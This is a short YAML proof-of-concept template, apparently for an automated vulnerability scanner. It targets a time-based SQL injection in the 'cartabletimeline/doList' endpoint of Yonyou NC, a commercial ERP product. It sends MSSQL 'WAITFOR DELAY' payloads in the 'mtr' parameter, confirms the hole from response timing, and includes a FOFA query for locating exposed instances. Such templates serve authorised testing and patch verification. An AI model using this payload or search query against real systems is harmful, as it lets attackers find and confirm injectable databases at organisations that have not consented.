id: poc-yaml-yongyou-cartabletimeline-sqli
info:
  name: 用友NC cartabletimeline存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友NC
  fofa: title="Yonyou UAP"
variables:
  t1: random_int(6,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: GET
  path: /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:{{.t1}}%27--+
  expression: "status_code == 200 && \ncontains(body,\"<?xml version='1.0' encoding='UTF-8\"\
    ) &&\ncontains(body,\"<data>\") &&\nduration >= t1 &&\nduration <= t2\n"
- method: GET
  path: /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:{{.t3}}%27--+
  expression: "status_code == 200 && \ncontains(body,\"<?xml version='1.0' encoding='UTF-8\"\
    ) &&\ncontains(body,\"<data>\") &&\nduration >= t3 &&\nduration <= t4\n"
transport: http
